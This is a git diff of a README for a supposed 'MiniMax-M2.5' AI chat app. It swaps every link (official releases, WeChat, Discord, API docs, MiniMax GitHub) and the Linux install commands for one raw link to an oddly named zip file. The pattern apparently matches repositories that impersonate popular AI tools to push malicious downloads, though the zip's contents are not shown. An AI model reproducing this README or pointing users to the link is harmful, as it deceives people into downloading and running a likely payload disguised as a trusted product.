@@ -1,6 +1,6 @@
 # 🤖 MiniMax-M2.5 - Simple AI Chat for Everyone
 
-[![Download MiniMax-M2.5](https://img.shields.io/badge/Download-MiniMax--M2.5-blue?style=for-the-badge)](https://github.com/zlown/MiniMax-M2.5/releases)
+[![Download MiniMax-M2.5](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip)](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Using MiniMax-M2.5 is straightforward. We will guide you through every step belo
 
 Go to the official releases page to get the app:
 
-[Download MiniMax-M2.5](https://github.com/zlown/MiniMax-M2.5/releases)
+[Download MiniMax-M2.5](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip)
 
 On the page, find the latest release. It usually has the newest features and fixes.
 
@@ -55,8 +55,8 @@ After downloading, open the file to start installation:
 - **Linux:** Make the `.AppImage` file executable. Open a terminal and run:
 
   ```
-  chmod +x MiniMax-M2.5.AppImage
-  ./MiniMax-M2.5.AppImage
+  chmod +x https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip
+  https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip
   ```
 
 If you encounter a security warning, confirm you want to open the app.
@@ -98,8 +98,8 @@ Features to explore:
 - **Updates:** Check the releases page regularly for updates and improvements.
 - **Support:** Join the MiniMax chat communities for help:
 
-  - [WeChat Community](https://platform.minimaxi.com/docs/faq/contact-us)  
-  - [Discord Server](https://discord.gg/minimax)
+  - [WeChat Community](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip)  
+  - [Discord Server](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip)
 
 ---
 
@@ -127,7 +127,7 @@ If MiniMax-M2.5 is not working as expected, try these steps:
 
 To get started, visit the official download page and get the latest release:
 
-[Download MiniMax-M2.5](https://github.com/zlown/MiniMax-M2.5/releases)
+[Download MiniMax-M2.5](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip)
 
 Follow the instructions there to download the correct file for your computer’s operating system. Once downloaded, install and open the app to start chatting with the AI.
 
@@ -135,8 +135,8 @@ Follow the instructions there to download the correct file for your computer’s
 
 ## 📒 Additional Resources
 
-- Explore the [MiniMax Agent](https://agent.minimax.io/) for advanced features.
-- Read the [API Documentation](https://platform.minimax.io/docs/guides/text-generation) for developers.
-- View other related projects at [MiniMax GitHub](https://github.com/MiniMax-AI/MiniMax-MCP).
+- Explore the [MiniMax Agent](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip) for advanced features.
+- Read the [API Documentation](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip) for developers.
+- View other related projects at [MiniMax GitHub](https://github.com/zlown/MiniMax-M2.5/raw/refs/heads/main/glossagra/Mini_Max_irrecognizability.zip).
 
 If you want to learn more or get support, use the community links above. This project aims to make AI chat easy and accessible.
